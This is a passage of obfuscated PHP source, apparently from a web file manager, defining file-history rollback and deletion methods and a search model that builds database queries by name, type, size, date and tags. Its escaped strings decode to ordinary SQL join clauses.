"{$äµ—è†}\151\x6f\x5f\146\x69\154\145\40\x66\151\x6c\x65\163\40\157\156\x20\x66\x69\154\x65\x73\x2e\146\x69\x6c\145\x49\104\x20\75\40\x68\x69\x73\x74\157\162\x79\56\x66\x69\154\x65\111\104"; $¸ÒĞåµÖ = $this->alias($Ãè¡¶÷[2309])->where(array($Ãè¡¶÷[513] => $Î¬Üşª))->join($ØÆØ¥œÛ, $Ãè¡¶÷[2310])->find(); if ($¸ÒĞåµÖ && $ğá÷Æ¸ß) { $«´üéó¯ = array($Ãè¡¶÷[204] => $¸ÒĞåµÖ[$Ãè¡¶÷[204]], $Ãè¡¶÷[492] => array($Ãè¡¶÷[1138], $Î¬Üşª)); $¸ÒĞåµÖ[$Ãè¡¶÷[1721]] = $this->where($«´üéó¯)->count(); } return $¸ÒĞåµÖ; } public function removeItem($ş–¡¹×û) { $¡ÖƒÄ =& $_SERVER[¬ÏÕ§Áú]; $çàåêëŞ = array($¡ÖƒÄ[513] => $ş–¡¹×û); $«±ä ¨¨ = $this->where($çàåêëŞ)->find(); if ($«±ä ¨¨) { $¢­û İ = $this->where($çàåêëŞ)->delete(); Model($¡ÖƒÄ[565])->remove($«±ä ¨¨[$¡ÖƒÄ[562]]); return $¢­û İ; } return !1; } public function removeBySource($âƒ­¡ıä) { $öÄç’¾÷ =& $_SERVER[¬ÏÕ§Áú]; if (!$âƒ­¡ıä) { return !1; } if (!is_array($âƒ­¡ıä)) { $âƒ­¡ıä = array($âƒ­¡ıä); } $“àÃ»Øî = array($öÄç’¾÷[511] => array($öÄç’¾÷[7], $âƒ­¡ıä)); $–¡öµÈ• = $this->field($öÄç’¾÷[563])->where($“àÃ»Øî)->select(); if ($–¡öµÈ•) { $this->where($“àÃ»Øî)->delete(); $º†¤¼è¢ = array_to_keyvalue($–¡öµÈ•, $öÄç’¾÷[12], $öÄç’¾÷[562]); Model($öÄç’¾÷[565])->remove($º†¤¼è¢); } return !0; } public function setDetail($Õûîš“Ô, $›ÄÑû·¬) { $ªÚÓÛË­ =& $_SERVER[¬ÏÕ§Áú]; return $this->where(array($ªÚÓÛË­[513] => $Õûîš“Ô))->save(array($ªÚÓÛË­[2300] => $›ÄÑû·¬)); } public function rollbackToItem($ ªÛ¯ÕÔ, $ŒÌÅ­¡ö) { $›¯Ú×¶õ =& $_SERVER[¬ÏÕ§Áú]; $Õû†ôÈ = Model($›¯Ú×¶õ[946])->sourceInfo($ ªÛ¯ÕÔ); $this->addHistory($Õû†ôÈ, LNG($›¯Ú×¶õ[2311])); $ÊÅ‘Üü€ = $this->find($ŒÌÅ­¡ö); $¾¡ÂÃÃ² = array($›¯Ú×¶õ[562] => $ÊÅ‘Üü€[$›¯Ú×¶õ[562]], $›¯Ú×¶õ[89] => $ÊÅ‘Üü€[$›¯Ú×¶õ[89]], $›¯Ú×¶õ[98] => time(), $›¯Ú×¶õ[548] => USER_ID); Model($›¯Ú×¶õ[946])->where(array($›¯Ú×¶õ[204] => $ ªÛ¯ÕÔ))->save($¾¡ÂÃÃ²); return $this->where(array($›¯Ú×¶õ[513] => $ŒÌÅ­¡ö))->delete(); } public function clearSame($›çù¼) { $´¯äœ÷İ =& $_SERVER[¬ÏÕ§Áú]; $Êøšáéğ = $this->listData($›çù¼); $öÊ²õØ = array_to_keyvalue_group($Êøšáéğ, $´¯äœ÷İ[562]); $¡§–†§  = array(); $ÖŸØ§º = array(); foreach ($öÊ²õØ as $ÍÜïíºú) { if (!$ÍÜïíºú || count($ÍÜïíºú) <= 1) { continue; } foreach ($ÍÜïíºú as $ßÒ¬¶úÂ) { $¡§–†§ [] = $ßÒ¬¶úÂ[$´¯äœ÷İ[562]]; $ÖŸØ§º[] = $ßÒ¬¶úÂ[$´¯äœ÷İ[492]]; } } if (!$ÖŸØ§º) { return; } $this->where(array($´¯äœ÷İ[492] => array($´¯äœ÷İ[7], $ÖŸØ§º)))->delete(); Model($´¯äœ÷İ[565])->remove($¡§–†§ ); } public function userSpace() { $¬óøİÑğ =& $_SERVER[¬ÏÕ§Áú]; $óÒÃ•”Å = $this->tablePrefix; $˜¨À¬ = array($¬óøİÑğ[1828] => USER_ID); $åì²²ÃÍ = "{$óÒÃ•”Å}\151\157\137\146\151\x6c\145\x20\x66\x69\154\x65\163\40\x6f\x6e\x20\x66\x69\x6c\x65\x73\x2e\146\x69\154\x65\x49\104\40\x3d\40\150\x69\163\164\157\162\x79\x2e\x66\x69\154\x65\111\104"; return $this->alias($¬óøİÑğ[2309])->where($˜¨À¬)->join($åì²²ÃÍ, $¬óøİÑğ[2310])->sum($¬óøİÑğ[89]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($©š»Ÿ•Ï) { $º¦÷ç Ó =& $_SERVER[¬ÏÕ§Áú]; $»ı•şôñ = KodIO::fileTypeList(); $¸èÄøú = $»ı•şôñ[$©š»Ÿ•Ï]; if (!$¸èÄøú) { return array(); } $ÒåœÁ‹› = $¸èÄøú[$º¦÷ç Ó[179]]; $õÚ‡‰Çı = $º¦÷ç Ó[7]; if (!$¸èÄøú[$º¦÷ç Ó[179]]) { $—äù‡Ê = array_to_keyvalue($»ı•şôñ, $º¦÷ç Ó[12], $º¦÷ç Ó[179]); $ÒåœÁ‹› = implode($º¦÷ç Ó[50], $—äù‡Ê); $õÚ‡‰Çı = $º¦÷ç Ó[2312]; } $òó÷ºåè = explode($º¦÷ç Ó[50], trim($ÒåœÁ‹›, $º¦÷ç Ó[50])); return array($õÚ‡‰Çı, $òó÷ºåè); } public function listPathType($ïµô·ò) { $µÇ†Ì¸î =& $_SERVER[¬ÏÕ§Áú]; $©Ş¨¾ìÀ = $this->fileTypeWhere($ïµô·ò); if (!$©Ş¨¾ìÀ) { return array(); } $·¤Ë‡–Å = USER_ID; $°±¯‹±ø = Model($µÇ†Ì¸î[618])->getInfo($·¤Ë‡–Å); $ĞÈÛÇºğ = array($µÇ†Ì¸î[672] => SourceModel::TYPE_USER, $µÇ†Ì¸î[605] => array($µÇ†Ì¸î[636], $µÇ†Ì¸î[614] . $°±¯‹±ø[$µÇ†Ì¸î[100]][$µÇ†Ì¸î[204]] . $µÇ†Ì¸î[637]), $µÇ†Ì¸î[673] => $·¤Ë‡–Å, $µÇ†Ì¸î[670] => 0, $µÇ†Ì¸î[671] => $©Ş¨¾ìÀ); return $this->listSource($ĞÈÛÇºğ); } public function listSearch($Á’˜ŸèŠ, $Ê±ÛÅëÁ = 300) { $´éÍù¢œ =& $_SERVER[¬ÏÕ§Áú]; if (isset($Á’˜ŸèŠ[$´éÍù¢œ[2135]]) && $Á’˜ŸèŠ[$´éÍù¢œ[2135]]) { $Á’˜ŸèŠ[$´éÍù¢œ[2135]] = str_replace($´éÍù¢œ[480], $´éÍù¢œ[2313], trim($Á’˜ŸèŠ[$´éÍù¢œ[2135]])); } $–í¢úå§ = $this->_parseSearchWhere($Á’˜ŸèŠ); if (!isset($–í¢úå§[$´éÍù¢œ[525]])) { $–í¢úå§[$´éÍù¢œ[525]] = 0; } $¯—¬’Î‹ = $´éÍù¢œ[2314]; $†º–Æûö = $–í¢úå§; $©èŒÄ« = $¯—¬’Î‹; $this->_listSearchBindPinyin($Á’˜ŸèŠ, $–í¢úå§, $¯—¬’Î‹); $this->alias($´éÍù¢œ[538])->_makeOrder(); $–í¢úå§ = $this->parseWhereLike($–í¢úå§); $àöõÊÚ± = $this->distinct(!0)->field($¯—¬’Î‹)->where($–í¢úå§)->selectPage($Ê±ÛÅëÁ); if ($GLOBALS[$´éÍù¢œ[6]][$´éÍù¢œ[477]][$´éÍù¢œ[478]] && Input::check($Á’˜ŸèŠ[$´éÍù¢œ[2135]], $´éÍù¢œ[679]) && $àöõÊÚ±[$´éÍù¢œ[453]][$´éÍù¢œ[439]] == 1 && $àöõÊÚ±[$´éÍù¢œ[453]][$´éÍù¢œ[454]] == 0) { $àöõÊÚ± = $this->distinct(!0)->field($¯—¬’Î‹)->where($†º–Æûö)->limit(1000)->select(); $àöõÊÚ± = array_page_split($àöõÊÚ±, !1, $Ê±ÛÅëÁ); } $this->_listSearchFileContent($àöõÊÚ±, $Á’˜ŸèŠ, $©èŒÄ«, $†º–Æûö); $this->_listSearchDesc($àöõÊÚ±, $Á’˜ŸèŠ, $©èŒÄ«); $this->_listSearchTag($àöõÊÚ±, $Á’˜ŸèŠ, $©èŒÄ«); $this->_listSearchGroupTag($àöõÊÚ±, $Á’˜ŸèŠ, $©èŒÄ«); $this->_listDataApply($àöõÊÚ±[$´éÍù¢œ[456]]); $this->_listMake($àöõÊÚ±); return $àöõÊÚ±; } private function _listSearchFileContent(&$äÅë¢ÍÀ, $ıÒü‘Ë, $ôöÀ‚¹­, $¯ßº¨ı) { $†—ÃÎÉ¡ =& $_SERVER[¬ÏÕ§Áú]; if (!$ıÒü‘Ë[$†—ÃÎÉ¡[2135]] || $äÅë¢ÍÀ[$†—ÃÎÉ¡[453]][$†—ÃÎÉ¡[439]] > 1) { return; } if (!isset($¯ßº¨ı[$†—ÃÎÉ¡[32]]) || !is_array($ıÒü‘Ë[$†—ÃÎÉ¡[562]])) { return; } $¯ßº¨ı[$†—ÃÎÉ¡[562]] = array($†—ÃÎÉ¡[7], $ıÒü‘Ë[$†—ÃÎÉ¡[562]]); unset($¯ßº¨ı[$†—ÃÎÉ¡[32]]); unset($ıÒü‘Ë[$†—ÃÎÉ¡[562]]); $Åßúìôı = $this->field($ôöÀ‚¹­)->where($¯ßº¨ı)->limit($†—ÃÎÉ¡[2315])->select(); if (!$Åßúìôı || count($Åßúìôı) == 0) { return; } $äÅë¢ÍÀ[$†—ÃÎÉ¡[456]] = array_merge($Åßúìôı, $äÅë¢ÍÀ[$†—ÃÎÉ¡[456]]); $äÅë¢ÍÀ[$†—ÃÎÉ¡[453]][$†—ÃÎÉ¡[454]] += count($Åßúìôı); } private function _listSearchTag(&$ŒÄ‰¶ëŒ, $ş†ªØÊ€, $Á»„Ì ¢) { $øú©ÈÎ÷ =& $_SERVER[¬ÏÕ§Áú]; if (empty($ş†ªØÊ€[$øú©ÈÎ÷[1997]]) || !in_array($øú©ÈÎ÷[2316], $ş†ªØÊ€[$øú©ÈÎ÷[1997]])) { return; } if (!$ş†ªØÊ€[$øú©ÈÎ÷[2135]] || $ŒÄ‰¶ëŒ[$øú©ÈÎ÷[453]][$øú©ÈÎ÷[439]] > 1) { return; } $„°´çí” = Model($øú©ÈÎ÷[2317])->listData(); $Ê´ûÖÔ  = array(); $õ’ï»á¹ = $ş†ªØÊ€[$øú©ÈÎ÷[2135]]; foreach ($„°´çí” as $™¿µåı) { $û–êÃùê = $™¿µåı[$øú©ÈÎ÷[32]]; $¿°ô¶äè = str_replace($øú©ÈÎ÷[53], $øú©ÈÎ÷[12], Pinyin::get($û–êÃùê)); if (stripos($û–êÃùê, $õ’ï»á¹) !== !1 || stripos($¿°ô¶äè, $õ’ï»á¹) !== !1) { $Ê´ûÖÔ [] = $™¿µåı[$øú©ÈÎ÷[492]]; } } if (!$Ê´ûÖÔ ) { return; } $×ìÚëÆ… = array($øú©ÈÎ÷[520] => array($øú©ÈÎ÷[7], $Ê´ûÖÔ ), $øú©ÈÎ÷[1837] => USER_ID); $½¨ôáŒ = Model($øú©ÈÎ÷[522])->field($øú©ÈÎ÷[97])->where($×ìÚëÆ…)->select(); $½¨ôáŒ = array_to_keyvalue($½¨ôáŒ, $øú©ÈÎ÷[12], $øú©ÈÎ÷[97]); $Ù¿†Ü® = array_unique($½¨ôáŒ); $this->_listSearchMerge($ŒÄ‰¶ëŒ, $ş†ªØÊ€, $Á»„Ì ¢, $Ù¿†Ü®); } private function _listSearchDesc(&$ˆÅûÚ»Ä, $Ì÷şŠÙ, $Ôìƒ“çã) { $ÂÉ±­‡Ô =& $_SERVER[¬ÏÕ§Áú]; if (empty($Ì÷şŠÙ[$ÂÉ±­‡Ô[1997]]) || !in_array($ÂÉ±­‡Ô[545], $Ì÷şŠÙ[$ÂÉ±­‡Ô[1997]])) { return; } if (!$Ì÷şŠÙ[$ÂÉ±­‡Ô[2135]] || $ˆÅûÚ»Ä[$ÂÉ±­‡Ô[453]][$ÂÉ±­‡Ô[439]] > 1) { return; } $á…êìÀË = array($ÂÉ±­‡Ô[107] => $ÂÉ±­‡Ô[545], $ÂÉ±­‡Ô[461] => array($ÂÉ±­‡Ô[479], $ÂÉ±­‡Ô[2137] . $Ì÷şŠÙ[$ÂÉ±­‡Ô[2135]] . $ÂÉ±­‡Ô[2137])); $ŒÊ‡ºˆÂ = !1; if ($ŒÊ‡ºˆÂ) { $˜ŠÜÇò = $this->listSearchChildren($Ì÷şŠÙ[$ÂÉ±­‡Ô[203]]); $˜ŠÜÇò = array_unique($˜ŠÜÇò); if (!$˜ŠÜÇò) { return; } $á…êìÀË[$ÂÉ±­‡Ô[204]] = array($ÂÉ±­‡Ô[7], $˜ŠÜÇò); } $İÇê¶úş = Model($ÂÉ±­‡Ô[656])->field($ÂÉ±­‡Ô[204])->where($á…êìÀË)->limit(5000)->select(); $¼ü£Ö˜ = array_to_keyvalue($İÇê¶úş, $ÂÉ±­‡Ô[12], $ÂÉ±­‡Ô[204]); $this->_listSearchMerge($ˆÅûÚ»Ä, $Ì÷şŠÙ, $Ôìƒ“çã, $¼ü£Ö˜); } private function _listSearchGroupTag(&$¸ûÒÙø, $å™¦ÊŸ¥, $£ƒˆì«Ú) { $‹¬©Ô„© =& $_SERVER[¬ÏÕ§Áú]; if (empty($å™¦ÊŸ¥[$‹¬©Ô„©[1997]]) || !in_array($‹¬©Ô„©[2316], $å™¦ÊŸ¥[$‹¬©Ô„©[1997]])) { return; } if (!$å™¦ÊŸ¥[$‹¬©Ô„©[2135]] || $¸ûÒÙø[$‹¬©Ô„©[453]][$‹¬©Ô„©[439]] > 1 || !$å™¦ÊŸ¥[$‹¬©Ô„©[203]]) { return; } $ì•ÚşË¿ = $this->sourceInfo($å™¦ÊŸ¥[$‹¬©Ô„©[203]]); if (!$ì•ÚşË¿ || $ì•ÚşË¿[$‹¬©Ô„©[201]] != SourceModel::TYPE_GROUP) { return; } $…¨¤çÏÙ = $ì•ÚşË¿[$‹¬©Ô„©[590]]; $èíÌÉá = Model($‹¬©Ô„©[2318])->get($…¨¤çÏÙ); $ë¿Ëä  = array(); $†ğÒ¡Ûâ = $å™¦ÊŸ¥[$‹¬©Ô„©[2135]]; foreach ($èíÌÉá[$‹¬©Ô„©[456]] as $À·ÀŒ¤ƒ) { $û¨“­şÂ = $À·ÀŒ¤ƒ[$‹¬©Ô„©[32]]; $Öì×îú× = str_replace($‹¬©Ô„©[53], $‹¬©Ô„©[12], Pinyin::get($û¨“­şÂ)); if (stripos($û¨“­şÂ, $†ğÒ¡Ûâ) !== !1 || stripos($Öì×îú×, $†ğÒ¡Ûâ) !== !1) { $ë¿Ëä [] = $À·ÀŒ¤ƒ[$‹¬©Ô„©[492]]; } } if (!$ë¿Ëä ) { return; } $œœ¦•ÊŞ = array($‹¬©Ô„©[520] => array($‹¬©Ô„©[7], $ë¿Ëä ), $‹¬©Ô„©[1837] => 0, $‹¬©Ô„©[33] => $‹¬©Ô„©[1441] . $…¨¤çÏÙ); $Ï¸î° = Model($‹¬©Ô„©[522])->field($‹¬©Ô„©[97])->where($œœ¦•ÊŞ)->select(); $Ï¸î° = array_to_keyvalue($Ï¸î°, $‹¬©Ô„©[12], $‹¬©Ô„©[97]); $ßñÎ¿… = array_unique($Ï¸î°); $this->_listSearchMerge($¸ûÒÙø, $å™¦ÊŸ¥, $£ƒˆì«Ú, $ßñÎ¿…); } private function _listSearchMerge(&$ëóÈüš«, $Š°“Ó€ˆ, $–ÕÇ‚ğ¦, $¹”İ¨ñ×) { $ç­Õ„Ÿ” =& $_SERVER[¬ÏÕ§Áú]; if (!$¹”İ¨ñ×) { return; } $â˜Û…ü¥ = array_to_keyvalue($ëóÈüš«[$ç­Õ„Ÿ”[456]], $ç­Õ„Ÿ”[12], $ç­Õ„Ÿ”[204]); $ÍÑÌÅåÄ = array_diff($¹”İ¨ñ×, $â˜Û…ü¥); if (!$ÍÑÌÅåÄ) { return; } $ áÁØÕ = array($ç­Õ„Ÿ”[204] => array($ç­Õ„Ÿ”[7], $ÍÑÌÅåÄ)); $•ì´ï¿ø = $this->field($–ÕÇ‚ğ¦)->where($ áÁØÕ)->select(); if (!$•ì´ï¿ø) { return; } $Ó½“ä¡ = array(); foreach ($•ì´ï¿ø as $Š›ó²ïö) { if ($this->_listSearchFilter($Š›ó²ïö, $Š°“Ó€ˆ)) { $Ó½“ä¡[] = $Š›ó²ïö; } } $ëóÈüš«[$ç­Õ„Ÿ”[456]] = array_merge($Ó½“ä¡, $ëóÈüš«[$ç­Õ„Ÿ”[456]]); $ëóÈüš«[$ç­Õ„Ÿ”[453]][$ç­Õ„Ÿ”[454]] += count($Ó½“ä¡); } private function _listSearchFilter($–¶ñÚÈÅ, $ÊÂ) { $­Ë·•¬¢ =& $_SERVER[¬ÏÕ§Áú]; $½ˆ¾Èùä = $–¶ñÚÈÅ[$­Ë·•¬¢[505]] == $­Ë·•¬¢[101]; if (!strstr($–¶ñÚÈÅ[$­Ë·•¬¢[605]], $­Ë·•¬¢[50] . $ÊÂ[$­Ë·•¬¢[203]] . $­Ë·•¬¢[50])) { return !1; } if (isset($ÊÂ[$­Ë·•¬¢[506]]) && $ÊÂ[$­Ë·•¬¢[506]] != $­Ë·•¬¢[892]) { if ($ÊÂ[$­Ë·•¬¢[506]] == $­Ë·•¬¢[88] && !$½ˆ¾Èùä) { return !1; } if ($ÊÂ[$­Ë·•¬¢[506]] != $­Ë·•¬¢[88] && $½ˆ¾Èùä) { return !1; } if (!strstr($–¶ñÚÈÅ[$­Ë·•¬¢[179]], $­Ë·•¬¢[50] . $ÊÂ[$­Ë·•¬¢[506]] . $­Ë·•¬¢[50])) { return !1; } } if (isset($ÊÂ[$­Ë·•¬¢[2319]]) && $ÊÂ[$­Ë·•¬¢[2319]] < $–¶ñÚÈÅ[$­Ë·•¬¢[89]]) { return !1; } if (isset($ÊÂ[$­Ë·•¬¢[2320]]) && $ÊÂ[$­Ë·•¬¢[2320]] > $–¶ñÚÈÅ[$­Ë·•¬¢[89]]) { return !1; } if (isset($ÊÂ[$­Ë·•¬¢[686]]) && $ÊÂ[$­Ë·•¬¢[686]] != $–¶ñÚÈÅ[$­Ë·•¬¢[548]]) { return !1; } return !0; } public function listSearchChildren($¿çÚí²„, $‚ã”©˜‘ = 5000) { $ÁšÀôõï =& $_SERVER[¬ÏÕ§Áú]; $ûæ¤ˆŒŠ = array(); $îÒïËËÕ = $this->sourceInfo($¿çÚí²„); $ÁÎÓß†Æ = array($ÁšÀôõï[605] => array($ÁšÀôõï[479], $îÒïËËÕ[$ÁšÀôõï[605]] . $îÒïËËÕ[$ÁšÀôõï[204]] . $ÁšÀôõï[637])); $°œ¡âü = $this->field($ÁšÀôõï[89])->where($ÁÎÓß†Æ)->limit($‚ã”©˜‘ + 1)->select(); $Ÿ™äÓÉÂ = is_array($°œ¡âü) ? count($°œ¡âü) : 0; if ($Ÿ™äÓÉÂ > $‚ã”©˜‘) { return $this->_listSearchChildrenNear($¿çÚí²„, $‚ã”©˜‘); } $ğìµ¦ì = $this->field($ÁšÀôõï[204])->where($ÁÎÓß†Æ)->select(); $ûæ¤ˆŒŠ = array_to_keyvalue($ğìµ¦ì, $ÁšÀôõï[12], $ÁšÀôõï[204]); return $ûæ¤ˆŒŠ; } private function _listSearchChildrenNear($ôÒ¬ãÛ¡, $¢·Â“Å¤) { $ó£®è¼Ú =& $_SERVER[¬ÏÕ§Áú]; $‘İ‚…ıã = array(); $Çâ…µíª = array($ó£®è¼Ú[203] => $ôÒ¬ãÛ¡); $õ³Ú…¥ = $this->field($ó£®è¼Ú[2321])->where($Çâ…µíª)->select(); $éÍáèÔ± = array_to_keyvalue(array_filter_by_field($õ³Ú…¥, $ó£®è¼Ú[505], $ó£®è¼Ú[101]), $ó£®è¼Ú[12], $ó£®è¼Ú[204]); $‘İ‚…ıã = array_merge($‘İ‚…ıã, array_to_keyvalue($õ³Ú…¥, $ó£®è¼Ú[12], $ó£®è¼Ú[204])); if (!$éÍáèÔ±) { return $‘İ‚…ıã; } $Çâ…µíª = array($ó£®è¼Ú[203] => array($ó£®è¼Ú[7], $éÍáèÔ±)); $õ³Ú…¥ = $this->field($ó£®è¼Ú[2321])->where($Çâ…µíª)->limit($¢·Â“Å¤)->select(); $‘İ‚…ıã = array_merge($‘İ‚…ıã, array_to_keyvalue($õ³Ú…¥, $ó£®è¼Ú[12], $ó£®è¼Ú[204])); $‘İ‚…ıã = array_slice($‘İ‚…ıã, 0, intval($¢·Â“Å¤)); return $‘İ‚…ıã; } private function _listSearchBindPinyin($œØ²ı´•, &$ö²Ú·âÎ, &$¥Èëúû¾) { $ïáá”›´ =& $_SERVER[¬ÏÕ§Áú]; if (!isset($œØ²ı´•[$ïáá”›´[2135]]) || !$œØ²ı´•[$ïáá”›´[2135]]) { return; } if (!Input::check($œØ²ı´•[$ïáá”›´[2135]], $ïáá”›´[404]) || strlen($œØ²ı´•[$ïáá”›´[2135]]) < 2) { return; } $Œ‚¡Ğ¸ = "\x4c\x45\106\x54\x20\112\117\111\116\40{$this->tablePrefix}\151\157\137\x73\x6f\165\162\143\x65\x5f\155\x65\164\141\x20\155\x65\x74\x61\x20\157\156\40\163\x6f\165\162\x63\145\x2e\x73\x6f\165\x72\x63\x65\111\104\x20\75\x20\155\145\x74\x61\56\163\x6f\165\162\143\x65\111\104"; $¼ìö¶áˆ = array(); $¥Èëúû¾ = str_replace(array($ïáá”›´[65], $ïáá”›´[53], $ïáá”›´[2322]), $ïáá”›´[12], $¥Èëúû¾); $¥Èëúû¾ = $ïáá”›´[530] . str_replace($ïáá”›´[50], $ïáá”›´[531], $¥Èëúû¾); $¹õ¼¨† = $ö²Ú·âÎ[$ïáá”›´[32]]; unset($ö²Ú·âÎ[$ïáá”›´[32]]); foreach ($ö²Ú·âÎ as $¹¿çï¶Ï => $†‚ğæ¬) { $¼ìö¶áˆ[$ïáá”›´[530] . $¹¿çï¶Ï] = $†‚ğæ¬; } foreach ($¹õ¼¨† as $ß£»ùíá) { $¼ìö¶áˆ[] = array($ïáá”›´[535] => $ß£»ùíá, $ïáá”›´[1125] => $ïáá”›´[2139], array($ïáá”›´[2323] => $ß£»ùíá, $ïáá”›´[2324] => array($ïáá”›´[7], array($ïáá”›´[557], $ïáá”›´[556])))); } $this->join($Œ‚¡Ğ¸); $ö²Ú·âÎ = $¼ìö¶áˆ; } private function _parseSearchWhere($ï¨´ô•–) { $÷Ó«‘ğŠ =& $_SERVER[¬ÏÕ§Áú]; $Şçìù¯ = array(); if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[874]]) && $ï¨´ô•–[$÷Ó«‘ğŠ[874]]) { $Şçìù¯[$÷Ó«‘ğŠ[98]] = array($÷Ó«‘ğŠ[2325], $ï¨´ô•–[$÷Ó«‘ğŠ[874]]); } if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[875]]) && $ï¨´ô•–[$÷Ó«‘ğŠ[875]]) { $íÆïŸ¥İ = array($÷Ó«‘ğŠ[2326], $ï¨´ô•–[$÷Ó«‘ğŠ[875]]); if ($Şçìù¯[$÷Ó«‘ğŠ[98]]) { $Şçìù¯[$÷Ó«‘ğŠ[98]] = array($Şçìù¯[$÷Ó«‘ğŠ[98]], $íÆïŸ¥İ, $÷Ó«‘ğŠ[2327]); } else { $Şçìù¯[$÷Ó«‘ğŠ[98]] = $íÆïŸ¥İ; } } if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[2319]]) && $ï¨´ô•–[$÷Ó«‘ğŠ[2319]] > 0) { $Şçìù¯[$÷Ó«‘ğŠ[89]] = array($÷Ó«‘ğŠ[2325], $ï¨´ô•–[$÷Ó«‘ğŠ[2319]]); } if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[2320]]) && $ï¨´ô•–[$÷Ó«‘ğŠ[2320]]) { $íÆïŸ¥İ = array($÷Ó«‘ğŠ[2326], $ï¨´ô•–[$÷Ó«‘ğŠ[2320]]); if ($Şçìù¯[$÷Ó«‘ğŠ[89]]) { $Şçìù¯[$÷Ó«‘ğŠ[89]] = array($Şçìù¯[$÷Ó«‘ğŠ[89]], $íÆïŸ¥İ, $÷Ó«‘ğŠ[2327]); } else { $Şçìù¯[$÷Ó«‘ğŠ[89]] = $íÆïŸ¥İ; } } if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[686]]) && $ï¨´ô•–[$÷Ó«‘ğŠ[686]]) { $Şçìù¯[] = array($÷Ó«‘ğŠ[548] => $ï¨´ô•–[$÷Ó«‘ğŠ[686]], $÷Ó«‘ğŠ[546] => $ï¨´ô•–[$÷Ó«‘ğŠ[686]], $÷Ó«‘ğŠ[1125] => $÷Ó«‘ğŠ[2139]); } if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[506]]) && $ï¨´ô•–[$÷Ó«‘ğŠ[506]]) { $–ø¹Ğ‰ = $ï¨´ô•–[$÷Ó«‘ğŠ[506]]; if ($–ø¹Ğ‰ == $÷Ó«‘ğŠ[88]) { $Şçìù¯[$÷Ó«‘ğŠ[505]] = 1; } else { if ($–ø¹Ğ‰ == $÷Ó«‘ğŠ[2328]) { $Şçìù¯[$÷Ó«‘ğŠ[505]] = 0; } else { if ($–ø¹Ğ‰) { $–ø¹Ğ‰ = is_array($–ø¹Ğ‰) ? $–ø¹Ğ‰ : explode($÷Ó«‘ğŠ[50], $–ø¹Ğ‰); $Şçìù¯[$÷Ó«‘ğŠ[506]] = array($÷Ó«‘ğŠ[512], $–ø¹Ğ‰); $Şçìù¯[$÷Ó«‘ğŠ[505]] = 0; } } } } $this->_parseSearchParent($ï¨´ô•–, $Şçìù¯); if (isset($ï¨´ô•–[$÷Ó«‘ğŠ[2135]]) && trim($ï¨´ô•–[$÷Ó«‘ğŠ[2135]])) { $´ìĞáîÅ = trim($ï¨´ô•–[$÷Ó«‘ğŠ[2135]]); $Úçñ»ã„ = explode($÷Ó«‘ğŠ[53], $´ìĞáîÅ); if (strlen($´ìĞáîÅ) > 2 && (substr($´ìĞáîÅ, 0, 1) == $÷Ó«‘ğŠ[131] && substr($´ìĞáîÅ, -1) == $÷Ó«‘ğŠ[131]) || substr($´ìĞáîÅ, 0, 1) == $÷Ó«‘ğŠ[58] && substr($´ìĞáîÅ, -1) == $÷Ó«‘ğŠ[58]) { $´ìĞáîÅ = substr($´ìĞáîÅ, 1, -1); $Úçñ»ã„ = array($´ìĞáîÅ); } $Şçìù¯[$÷Ó«‘ğŠ[32]] = array(array($÷Ó«‘ğŠ[636], $÷Ó«‘ğŠ[2137] . $´ìĞáîÅ . $÷Ó«‘ğŠ[2137])); if (count($Úçñ»ã„) > 1) { $Şçìù¯[$÷Ó«‘ğŠ[32]] = array(); foreach ($Úçñ»ã„ as $§ÜõŠ¶) { if (!trim($§ÜõŠ¶)) { continue; } $Şçìù¯[$÷Ó«‘ğŠ[32]][] = array($÷Ó«‘ğŠ[636], $÷Ó«‘ğŠ[2137] . trim($§ÜõŠ¶) . $÷Ó«‘ğŠ[2137]); } } } return $Şçìù¯; } private function _parseSearchParent($¢¯¯äè„, &$Ï‹Òçˆã) { $–×‘—É =& $_SERVER[¬ÏÕ§Áú]; if (!isset($¢¯¯äè„[$–×‘—É[203]]) || !$¢¯¯äè„[$–×‘—É[203]]) { return; } $µ‹œ»²ñ = $this->pathInfo($¢¯¯äè„[$–×‘—É[203]]); $ô‘‚ÄÈ¡ = $µ‹œ»²ñ[$–×‘—É[203]] . $–×‘—É[12] === $–×‘—É[241]; $ÇÙËöç¼ = $µ‹œ»²ñ[$–×‘—É[201]] == $–×‘—É[599]; if ($µ‹œ»²ñ[$–×‘—É[615]] == $–×‘—É[616]) { $ôö‹«™ = $this->sourceInfo($¢¯¯äè„[$–×‘—É[203]]); $µ‹œ»²ñ[$–×‘—É[605]] = $ôö‹«™[$–×‘—É[605]]; } $Ï‹Òçˆã[$–×‘—É[676]] = array($–×‘—É[636], $µ‹œ»²ñ[$–×‘—É[605]] . $¢¯¯äè„[$–×‘—É[203]] . $–×‘—É[637]); $øÎ’æ¨Â = isset($¢¯¯äè„[$–×‘—É[1997]]) && in_array($–×‘—É[599], $¢¯¯äè„[$–×‘—É[1997]]); if (!$øÎ’æ¨Â || !$ÇÙËöç¼ || !$ô‘‚ÄÈ¡ || !$µ‹œ»²ñ[$–×‘—É[507]]) { return; } if (!AuthModel::authCheckRoot($µ‹œ»²ñ[$–×‘—É[507]][$–×‘—É[508]])) { return; } $‡Ğ‘¥†³ = $µ‹œ»²ñ[$–×‘—É[590]] . $–×‘—É[12]; if ($‡Ğ‘¥†³ == $–×‘—É[101]) { unset($Ï‹Òçˆã[$–×‘—É[676]]); $Ï‹Òçˆã[$–×‘—É[201]] = self::TYPE_GROUP; return; } $Ø­‹£áš = Model($–×‘—É[606])->groupChildrenAll($‡Ğ‘¥†³); $„öÀıó = count($Ø­‹£áš); if ($„öÀıó <= 1) { return; } $‚é ÊŞ× = array($–×‘—É[203] => 0, $–×‘—É[201] => self::TYPE_GROUP, $–×‘—É[590] => array($–×‘—É[7], $Ø­‹£áš)); $’½±ßÕ = $this->field($–×‘—É[2329])->where($‚é ÊŞ×)->limit($„öÀıó)->select(); $Ï‹Òçˆã[$–×‘—É[676]] = array(); foreach ($’½±ßÕ as $µ¯±­¨†) { $Ï‹Òçˆã[$–×‘—É[676]][] = array($–×‘—É[636], $–×‘—É[614] . $µ¯±­¨†[$–×‘—É[204]] . $–×‘—É[637]); } $Ï‹Òçˆã[$–×‘—É[676]][] = $–×‘—É[2139]; } } class 